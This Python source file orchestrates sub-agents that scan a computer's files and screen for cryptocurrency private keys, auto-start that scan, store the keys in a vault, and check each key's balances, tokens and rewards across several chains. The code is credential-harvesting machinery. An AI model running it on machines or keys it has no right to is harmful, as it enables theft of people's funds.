"""
MultimodalOrchestrator - Wires all sub-agents together

This is the core orchestrator that:
1. Runs KeyReducerAgent for continuous key normalization
2. Runs ComputerScannerAgent for non-destructive filesystem scan
3. Routes all events through a central event bus
4. Exposes safe metadata to assistant (no raw keys)
"""

import time
import os
import threading
import queue
from typing import Callable, Dict, List, Optional, Any
from dataclasses import dataclass
from datetime import datetime, timezone
import requests
from concurrent.futures import ThreadPoolExecutor
import threading
import time

from guardian.subagents.key_reducer import KeyReducerAgent, KeyFound
from guardian.subagents.computer_scanner import ComputerScannerAgent, ScanHit
from guardian.subagents.screen_watcher import ScreenWatcherAgent
from guardian.subagents.mixhunter import MixHunterEngine
from vault.service import Vault

# Common high-value ERC20 tokens for discovery enrichment
COMMON_ERC20 = {
    "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    "DAI": "0x6B175474E89094C44Da98b954EedeAC495271d0F",
    "LINK": "0x514910771AF9Ca656af840dff83E8264EcF986CA"
}

# Global rate limiters to prevent API bans
LAST_CALL_TIMES = {}
RATE_LIMIT_LOCK = threading.Lock()
MIN_INTERVAL = 0.5  # 500ms between calls to the same host

def _rate_limited_request(url: str, method: str = "GET", **kwargs) -> Optional[requests.Response]:
    from urllib.parse import urlparse
    host = urlparse(url).netloc
    
    with RATE_LIMIT_LOCK:
        now = time.time()
        last_call = LAST_CALL_TIMES.get(host, 0)
        if now - last_call < MIN_INTERVAL:
            time.sleep(MIN_INTERVAL - (now - last_call))
        LAST_CALL_TIMES[host] = time.time()
    
    try:
        if method == "GET": return requests.get(url, **kwargs)
        return requests.post(url, **kwargs)
    except Exception: return None

# Multi-provider RPC rotation for speed and reliability
ETH_RPC_PROVIDERS = [
    'https://cloudflare-eth.com',
    'https://eth.llamarpc.com',
    'https://ethereum.publicnode.com',
    'https://rpc.ankr.com/eth',
    'https://eth-mainnet.public.blastapi.io'
]
_eth_rpc_index = 0
_rpc_lock = threading.Lock()

def get_next_eth_rpc() -> str:
    global _eth_rpc_index
    with _rpc_lock:
        url = ETH_RPC_PROVIDERS[_eth_rpc_index]
        _eth_rpc_index = (_eth_rpc_index + 1) % len(ETH_RPC_PROVIDERS)
        return url

def quick_check_balance(address: str, chain: str) -> Dict[str, Any]:
    """Quickly check balance and history for discovery events"""
    results = {"balance": 0.0, "unconfirmed": 0.0, "tx_count": 0, "rewards": 0.0, "tokens": {}}
    try:
        chain_lower = chain.lower()
        # Support for 8 chains (BTC, tBTC, LTC, DOGE, DASH, ETH, ETC, BCH)
        if any(c in chain_lower for c in ("btc", "bitcoin", "tbtc", "ltc", "doge", "dash", "bch", "etc")):
            if "btc" in chain_lower or "bitcoin" in chain_lower:
                if "tbtc" in chain_lower:
                    url = f"https://blockstream.info/testnet/api/address/{address}"
                else:
                    url = f"https://blockstream.info/api/address/{address}"
            elif chain_lower == "tbtc":
                url = f"https://blockstream.info/testnet/api/address/{address}"
            else:
                # Use Blockchair for alt-chains
                coin_map = {"ltc": "litecoin", "doge": "dogecoin", "dash": "dash", "bch": "bitcoin-cash", "bitcoin-cash": "bitcoin-cash"}
                coin = coin_map.get(chain_lower, "bitcoin")
                url = f"https://api.blockchair.com/{coin}/dashboards/address/{address}"
            
            resp = _rate_limited_request(url, timeout=5)
            if resp and resp.status_code == 200:
                data = resp.json()
                if "chain_stats" in data: # Blockstream logic
                    stats = data.get('chain_stats', {})
                    mempool = data.get('mempool_stats', {})
                    results["balance"] = (stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)) / 1e8
                    results["unconfirmed"] = (mempool.get('funded_txo_sum', 0) - mempool.get('spent_txo_sum', 0)) / 1e8
                    results["tx_count"] = stats.get('tx_count', 0) + mempool.get('tx_count', 0)
                elif "data" in data and address in data["data"]: # Blockchair logic
                    addr_data = data["data"][address]["address"]
                    results["balance"] = addr_data.get('balance', 0) / 1e8
                    results["tx_count"] = addr_data.get('transaction_count', 0)

        elif chain_lower in ("eth", "ethereum", "etc"):
            # Rotate through RPC providers
            rpc_url = get_next_eth_rpc() if chain_lower != "etc" else "https://ethereumclassic.network"
            resp = _rate_limited_request(
                rpc_url,
                json={"jsonrpc":"2.0","method":"eth_getBalance","params":[address, "latest"],"id":1},
                timeout=5
            )
            if resp and resp.status_code == 200:
                res_data = resp.json()
                if 'result' in res_data:
                    results["balance"] = int(res_data['result'], 16) / 1e18
            
            # Check transaction count (History)
            resp_tx = _rate_limited_request(
                rpc_url,
                json={"jsonrpc":"2.0","method":"eth_getTransactionCount","params":[address, "latest"],"id":1},
                timeout=5
            )
            if resp_tx and resp_tx.status_code == 200:
                res_tx = resp_tx.json()
                if 'result' in res_tx:
                    results["tx_count"] = int(res_tx['result'], 16)

            # Refactor: Use Etherscan API for unconfirmed incoming and rewards (internal txs)
            if chain_lower in ("eth", "ethereum"):
                api_key = os.environ.get("ETHERSCAN_API_KEY", "demo")
                
                # Check Normal Transactions for unconfirmed incoming (confirmations=0)
                tx_url = f"https://api.etherscan.io/api?module=account&action=txlist&address={address}&startblock=0&endblock=99999999&sort=desc&apikey={api_key}"
                resp_tx = _rate_limited_request(tx_url, timeout=5)
                if resp_tx and resp_tx.status_code == 200:
                    data = resp_tx.json()
                    if data.get("status") == "1" and isinstance(data.get("result"), list):
                        tx_list = data["result"]
                        # Refresh tx_count with more precise data from history
                        results["tx_count"] = max(results["tx_count"], len(tx_list))
                        # Scan for incoming with 0 confirmations (pending inclusion)
                        for tx in tx_list[:20]:
                            if tx.get("to", "").lower() == address.lower() and tx.get("confirmations") == "0":
                                results["unconfirmed"] += int(tx.get("value", 0)) / 1e18

                # Check Internal Transactions for owed rewards/claimables
                internal_url = f"https://api.etherscan.io/api?module=account&action=txlistinternal&address={address}&startblock=0&endblock=99999999&sort=desc&apikey={api_key}"
                resp_int = _rate_limited_request(internal_url, timeout=5)
                if resp_int and resp_int.status_code == 200:
                    data = resp_int.json()
                    if data.get("status") == "1" and isinstance(data.get("result"), list):
                        # Internal incoming often represents reward payouts from protocols
                        for itx in data["result"]:
                            if itx.get("to", "").lower() == address.lower():
                                results["rewards"] += int(itx.get("value", 0)) / 1e18

                # Check for common ERC20 tokens on Ethereum Mainnet
                for symbol, contract in COMMON_ERC20.items():
                    # balanceOf selector: 70a08231
                    call_data = f"0x70a08231000000000000000000000000{address[2:].lower()}"
                    resp_token = _rate_limited_request(
                        rpc_url,
                        json={"jsonrpc":"2.0","method":"eth_call","params":[{"to": contract, "data": call_data}, "latest"],"id":1},
                        timeout=5
                    )
                    if resp_token and resp_token.status_code == 200:
                        res_token = resp_token.json()
                        if 'result' in res_token and res_token['result'] != '0x':
                            try:
                                val = int(res_token['result'], 16)
                                if val > 0:
                                    # Decimals: USDT/USDC (6), DAI/LINK (18)
                                    div = 1e6 if symbol in ("USDT", "USDC") else 1e18
                                    results["tokens"][symbol] = val / div
                            except: pass

    except Exception as e:
        print(f"[Orchestrator] Balance check failed for {address}: {e}")
    return results


@dataclass
class OrchestratorEvent:
    """Event from any sub-agent"""
    event_type: str
    source: str
    data: Dict[str, Any]
    timestamp: datetime


class MultimodalOrchestrator:
    """
    Central orchestrator for all sub-agents
    """
    
    def __init__(
        self,
        config: Dict[str, Any],
        vault: Optional[Vault] = None,
        assistant_callback: Optional[Callable] = None,
    ):
        self.config = config
        self.vault = vault or Vault()
        self.assistant_callback = assistant_callback
        
        # Event bus
        self._event_queue: queue.Queue = queue.Queue(maxsize=10000)
        self._event_handlers: Dict[str, List[Callable]] = {}
        
        # Sub-agents
        self.key_reducer: Optional[KeyReducerAgent] = None
        self.computer_scanner: Optional[ComputerScannerAgent] = None
        self.screen_watcher: Optional[ScreenWatcherAgent] = None
        self.mixhunter: Optional[MixHunterEngine] = None
        
        # State
        self._running = False
        self._threads: List[threading.Thread] = []
        self._price_cache: Dict[str, float] = {}
        self._last_price_fetch = 0.0
        self._price_lock = threading.Lock()
        self._balance_executor = ThreadPoolExecutor(max_workers=10)
        
        # Stats
        self._stats = {
            'events_processed': 0,
            'keys_found': 0,
            'total_value_usd': 0.0,
            'start_time': 0.0,
        }
        self.discovered_hits = []
        self._hits_lock = threading.Lock()

    def _get_live_prices(self) -> Dict[str, float]:
        """Fetch live crypto prices with a 5-minute cache and fallback logic"""
        with self._price_lock:
            now = time.time()
            if now - self._last_price_fetch < 300 and self._price_cache:
                return self._price_cache

            # Try Primary: CoinGecko
            prices = self._fetch_coingecko_prices()
            
            # Fallback: CryptoCompare
            if not prices:
                print("[Orchestrator] CoinGecko failed/limited, trying CryptoCompare fallback...")
                prices = self._fetch_cryptocompare_prices()
            
            if prices:
                self._price_cache = prices
                self._last_price_fetch = now
            
            return self._price_cache

    def _fetch_coingecko_prices(self) -> Optional[Dict[str, float]]:
        try:
            url = "https://api.coingecko.com/api/v3/simple/price"
            params = {
                "ids": "bitcoin,ethereum,litecoin,dogecoin,dash,bitcoin-cash,ethereum-classic",
                "vs_currencies": "usd"
            }
            resp = requests.get(url, params=params, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                mapping = {
                    "btc": "bitcoin", "eth": "ethereum", "ltc": "litecoin", 
                    "doge": "dogecoin", "dash": "dash", "bch": "bitcoin-cash", 
                    "etc": "ethereum-classic"
                }
                return {coin: data.get(id, {}).get("usd", 0.0) for coin, id in mapping.items()}
        except Exception: pass
        return None

    def _fetch_cryptocompare_prices(self) -> Optional[Dict[str, float]]:
        try:
            url = "https://min-api.cryptocompare.com/data/pricemulti"
            params = {"fsyms": "BTC,ETH,LTC,DOGE,DASH,BCH,ETC", "tsyms": "USD"}
            resp = requests.get(url, params=params, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                mapping = {"btc": "BTC", "eth": "ETH", "ltc": "LTC", "doge": "DOGE", "dash": "DASH", "bch": "BCH", "etc": "ETC"}
                return {coin: data.get(sym, {}).get("USD", 0.0) for coin, sym in mapping.items()}
        except Exception: pass
        return None
    
    def _setup_key_reducer(self):
        """Setup KeyReducerAgent from config"""
        kr_config = self.config.get('key_reducer', {})
        
        self.key_reducer = KeyReducerAgent(
            balance_checkers=self.config.get('balance_checkers', {}),
            vault=self.vault,
            assistant=self,
            min_balance_usd=kr_config.get('min_balance_usd', 2000.0),
            watch_files=kr_config.get('watch_files', []),
        )
    
    def _setup_computer_scanner(
        self,
        scan_paths: Optional[List[str]] = None,
        richlist_path: Optional[str] = None,
        min_balance_usd: Optional[float] = None,
        skip_balance_check: bool = False,
    ):
        """Setup ComputerScannerAgent from config or override params"""
        cs_config = self.config.get('computer_scanner', {})
        
        self.computer_scanner = ComputerScannerAgent(
            scan_paths=scan_paths if scan_paths is not None else cs_config.get('scan_paths'),
            balance_checkers=self.config.get('balance_checkers', {}),
            vault=self.vault,
            assistant=self,
            min_balance_usd=min_balance_usd if min_balance_usd is not None else cs_config.get('min_balance_usd', 0.0),
            richlist_path=richlist_path if richlist_path is not None else cs_config.get('richlist_path'),
            tokenlist_path=cs_config.get('tokenlist_path'),
            btc_recover_tokens=cs_config.get('btc_recover_tokens'),
            btc_recover_max_tokens=cs_config.get('btc_recover_max_tokens', 4),
            skip_balance_check=skip_balance_check,
        )
    
    def start(self):
        """Start all sub-agents"""
        if self._running:
            return
        
        print("[Orchestrator] Starting all sub-agents...")
        
        # Setup sub-agents
        self._setup_key_reducer()
        self._setup_computer_scanner()
        self.screen_watcher = ScreenWatcherAgent(assistant=self)
        self.mixhunter = MixHunterEngine(assistant=self)
        
        self._running = True
        self._stats['start_time'] = time.time()
        
        # Start KeyReducer
        if self.key_reducer:
            self.key_reducer.start(num_workers=4)
            
            # Start KeyReducer hit consumer
            t = threading.Thread(target=self._consume_key_reducer_hits, daemon=True)
            t.start()
            self._threads.append(t)

        # Start ScreenWatcher
        if self.screen_watcher:
            self.screen_watcher.start()

        # Start MixHunter (optional based on config)
        if self.config.get('mixhunter', {}).get('enabled', False):
            self.mixhunter.start(num_workers=self.config['mixhunter'].get('workers', 2))
        
        # Start ComputerScanner (idle until explicitly started via API/CLI)
        if self.computer_scanner:
            # AUTO-START PRIORITY SCAN
            self.computer_scanner.start(num_workers=1)

            t = threading.Thread(target=self._consume_computer_scanner_hits, daemon=True)
            t.start()
            self._threads.append(t)
        
        # Start event processor
        t = threading.Thread(target=self._process_events, daemon=True)
        t.start()
        self._threads.append(t)
        
        print("[Orchestrator] All sub-agents started")
    
    def stop(self):
        """Stop all sub-agents"""
        print("[Orchestrator] Stopping all sub-agents...")
        
        self._running = False
        
        if self.key_reducer:
            self.key_reducer.stop()
        
        if self.computer_scanner:
            self.computer_scanner.stop()

        if self.screen_watcher:
            self.screen_watcher.stop()

        if self.mixhunter:
            self.mixhunter.stop()
        
        for t in self._threads:
            t.join(timeout=2)
        
        self._threads.clear()
        print("[Orchestrator] All sub-agents stopped")
    
    def _consume_key_reducer_hits(self):
        """Consume hits from KeyReducer"""
        if not self.key_reducer:
            return
        
        for key_found in self.key_reducer.found_keys():
            if not self._running:
                break
            
            event_data = {
                'key_type': key_found.key_type,
                'addresses': key_found.addresses,
                'balances': key_found.balances,
                'total_usd': key_found.total_usd,
                'source': key_found.source,
                'timestamp': key_found.timestamp.isoformat(),
            }

            with self._hits_lock:
                self.discovered_hits.append(event_data)
                if len(self.discovered_hits) > 1000:
                    self.discovered_hits.pop(0)

            event = OrchestratorEvent(
                event_type="key_reducer:found",
                source="key_reducer",
                data=event_data,
                timestamp=datetime.now(timezone.utc),
            )
            
            self._event_queue.put_nowait(event)
    
    def _consume_computer_scanner_hits(self):
        """Consume hits from ComputerScanner"""
        if not self.computer_scanner:
            return
        
        for hit in self.computer_scanner.hits():
            if not self._running:
                break
            
            # Offload balance check to thread pool
            self._balance_executor.submit(self._process_hit_async, hit)

    def _process_hit_async(self, hit: ScanHit):
        """Asynchronous hit processing with balance check"""
        balances = hit.balances or {}
        tx_counts = {}
        all_rewards = {}
        all_tokens = {}
        prices = self._get_live_prices()
        total_usd = 0.0

        for chain, addr in hit.addresses.items():
            check = quick_check_balance(addr, chain)
            # Include internal rewards and unconfirmed funds in the reporting balance
            balances[chain] = check["balance"] + check.get("unconfirmed", 0.0) + check.get("rewards", 0.0)
            tx_counts[chain] = check["tx_count"]
            all_rewards[chain] = check.get("rewards", 0.0)
            all_tokens[chain] = check.get("tokens", {})
            
            chain_key = chain.lower()
            price = prices.get(chain_key, 0.0)
            # Fallback for naming variations
            if not price:
                if "bitcoin" in chain_key: price = prices.get("btc", 0.0)
                elif "ethereum" in chain_key: price = prices.get("eth", 0.0)
            
            total_usd += balances.get(chain, 0.0) * price
            
            # Add token value to USD total (assume stables ~$1, LINK ~$18)
            for t_sym, t_amount in all_tokens[chain].items():
                total_usd += t_amount * (18.0 if t_sym == "LINK" else 1.0)

        event_data = {
            'artifact_type': hit.artifact_type,
            'path': hit.path,
            'addresses': hit.addresses,
            'balances': balances,
            'history': tx_counts,
            'rewards': all_rewards,
            'tokens': all_tokens,
            'total_usd': total_usd,
            'metadata': hit.metadata,
            'timestamp': hit.timestamp.isoformat(),
        }

        with self._hits_lock:
            self.discovered_hits.append(event_data)
            if len(self.discovered_hits) > 1000:
                self.discovered_hits.pop(0)

        event = OrchestratorEvent(
            event_type="computer_scan:found",
            source="computer_scanner",
            data=event_data,
            timestamp=datetime.now(timezone.utc),
        )
        self._event_queue.put_nowait(event)
    
    def _process_events(self):
        """Process events from queue"""
        while self._running:
            try:
                event = self._event_queue.get(timeout=1)
                
                # Update stats
                self._stats['events_processed'] += 1
                
                if 'found' in event.event_type:
                    self._stats['keys_found'] += 1
                    total_usd = event.data.get('balance_usd', 0) or event.data.get('total_usd', 0)
                    self._stats['total_value_usd'] += total_usd
                
                # Call registered handlers
                handlers = self._event_handlers.get(event.event_type, [])
                for handler in handlers:
                    try:
                        handler(event)
                    except Exception as e:
                        print(f"[Orchestrator] Handler error: {e}")
                
                # Call assistant callback (safe data only)
                if self.assistant_callback:
                    try:
                        self.assistant_callback(event)
                    except Exception as e:
                        print(f"[Orchestrator] Assistant callback error: {e}")
                
            except queue.Empty:
                continue
    
    def on_event(self, event_type: str, handler: Callable):
        """Register event handler"""
        if event_type not in self._event_handlers:
            self._event_handlers[event_type] = []
        self._event_handlers[event_type].append(handler)
    
    def feed_text(self, text: str, source: str = "unknown", context: str = ""):
        """Feed text to KeyReducer for scanning"""
        if self.key_reducer:
            self.key_reducer.feed_text(text, source=source, context=context)
    
    def get_status(self) -> Dict:
        """Get orchestrator status"""
        status = {
            'running': self._running,
            'stats': self._stats.copy(),
            'vault_stats': self.vault.get_stats(),
            'agents': {
                'key_reducer': {'running': self.key_reducer.is_running if self.key_reducer else False},
                'screen_watcher': {'running': self.screen_watcher._running if self.screen_watcher else False},
                'mixhunter': {'running': self.mixhunter._running if self.mixhunter else False},
            }
        }
        
        if self.computer_scanner:
            cs_stats = self.computer_scanner.stats
            status['computer_scanner'] = {
                'running': self.computer_scanner.is_running,
                'paused': self.computer_scanner.is_paused,
                'files_scanned': cs_stats.get('files_scanned', 0),
                'artifacts_found': cs_stats.get('artifacts_found', 0),
                'keys_extracted': cs_stats.get('keys_extracted', 0),
                'richlist_hits': cs_stats.get('richlist_hits', 0),
            }
        
        return status
    
    def receive_event(self, event_type: str, data: Dict):
        """Receive event from sub-agents (for KeyReducer assistant callback)"""
        event = OrchestratorEvent(
            event_type=event_type,
            source="key_reducer",
            data=data,
            timestamp=datetime.now(timezone.utc),
        )
        self._event_queue.put_nowait(event)
